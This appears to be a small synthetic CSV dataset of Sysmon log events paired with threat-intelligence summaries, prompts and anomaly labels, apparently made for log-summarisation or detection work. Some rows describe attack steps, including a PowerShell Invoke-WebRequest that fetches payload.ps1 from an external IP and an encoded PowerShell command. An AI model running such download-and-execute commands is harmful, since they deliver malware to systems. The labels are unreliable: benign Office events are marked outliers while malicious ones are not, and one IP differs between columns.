id,sysmon_log,cti_summary,generated_summary,anomaly_score,outlier_label
1,Process Create: User Alice launched chrome.exe PID 4200 from C:\Program Files\Google\Chrome\chrome.exe,User Alice executed chrome.exe to initiate a browsing session on the system.,Summarize this SYSMON event as a CTI report:Process Create: User Alice launched chrome.exe PID 4200 from C:\Program Files\Google\Chrome\chrome.exe,-0.009912108543114417,1
2,Network Connect: powershell.exe PID 3312 connected to 192.168.1.4:443 via TCP,"PowerShell established an outbound TCP connection to the internal IP 192.168.1.4 over port 443, possibly to execute remote commands.",Summarize this SYSMON event as a CTI report:Network Connect: powershell.exe PID 3312 connected to 192.168.1.4:443 via TCP,-0.02411034648535887,1
3,File Create: notepad.exe created file invoice.txt in Documents,Notepad created an invoice.txt text file in the user's Documents folder.,Summarize this SYSMON event as a CTI report:File Create: notepad.exe created file invoice.txt in Documents,-0.028992525935722213,1
4,Process Create: python.exe PID 5541 launched by Bob from C:\Python39,User Bob executed python.exe to run a Python script on the local machine.,Summarize this SYSMON event as a CTI report:Process Create: python.exe PID 5541 launched by Bob from C:\Python39,-0.025929614501101594,1
5,Registry Modification: winword.exe modified registry key HKCU\Software\Microsoft\Office,Microsoft Word updated registry settings under the user's Office configuration.,Summarize this SYSMON event as a CTI report:Registry Modification: winword.exe modified registry key HKCU\Software\Microsoft\Office,0.01138776284543297,-1
6,Process Create: powershell.exe launched with encoded command -enc UABUADA...,PowerShell executed a Base64-encoded command indicating potential script-based attack activity.,Summarize this SYSMON event as a CTI report:Process Create: powershell.exe launched with encoded command -enc UABUADA...,-0.030669513713930674,1
7,Network Connect: svchost.exe connected to 23.81.120.44:8080,"svchost.exe connected to an external IP over port 8080, behavior consistent with command-and-control beaconing.",Summarize this SYSMON event as a CTI report:Network Connect: svchost.exe connected to 23.81.120.44:8080,-0.01911078741624589,1
8,File Create: rundll32.exe created file tmp.dll in AppData\Local\Temp,"rundll32 created tmp.dll in a temporary folder, suggesting possible DLL side-loading activity.",Summarize this SYSMON event as a CTI report:File Create: rundll32.exe created file tmp.dll in AppData\Local\Temp,-0.021191100210163738,1
9,Driver Load: ntoskrnl.exe loaded driver intelppm.sys,The operating system kernel loaded the intelppm.sys driver as part of normal CPU power management.,Summarize this SYSMON event as a CTI report:Driver Load: ntoskrnl.exe loaded driver intelppm.sys,-0.005151594411568261,1
10,Network Connect: chrome.exe connected to accounts.google.com via HTTPS,"Chrome connected to Google's authentication service over HTTPS, likely for user login.",Summarize this SYSMON event as a CTI report:Network Connect: chrome.exe connected to accounts.google.com via HTTPS,-0.006302146068437042,1
11,Process Create: powershell.exe executed command Invoke-WebRequest http://185.11.102.9/payload.ps1,"PowerShell downloaded a remote script from external IP 185.11.102.9 using Invoke-WebRequest, indicating possible malware delivery.",Summarize this SYSMON event as a CTI report:Process Create: powershell.exe executed command Invoke-WebRequest http://185.102.11.9/payload.ps1,-0.019476449954335617,1
12,WMI Event: wmiprvse.exe executed consumer event query SELECT * FROM __InstanceCreationEvent,"wmiprvse executed a WMI consumer subscription query, commonly seen during reconnaissance or system inventory enumeration.",Summarize this SYSMON event as a CTI report:WMI Event: wmiprvse.exe executed consumer event query SELECT * FROM __InstanceCreationEvent,-0.023362225555140392,1
13,File Create: excel.exe created file budget_2024.xlsx in Documents,Excel created a spreadsheet file named budget_2024.xlsx in the user's Documents folder.,Summarize this SYSMON event as a CTI report:File Create: excel.exe created file budget_2024.xlsx in Documents,0.01315691220252635,-1
14,Process Terminate: lgpo.exe PID 4552 terminated unexpectedly,"lgpo.exe terminated unexpectedly, suggesting possible manipulation of local group policy settings.",Summarize this SYSMON event as a CTI report:Process Terminate: lgpo.exe PID 4552 terminated unexpectedly,0.001084324014942295,-1
15,Scheduled Task: schtasks.exe created task 'WindowsTelemetryUpload' scheduled hidden daily at 03:00,"schtasks created a hidden scheduled task named WindowsTelemetryUpload to run daily, indicating possible persistence mechanism.",Summarize this SYSMON event as a CTI report:Scheduled Task: schtasks.exe created task 'WindowsTelemetryUpload' scheduled hidden daily at 03:00,-0.00027108100373562927,1
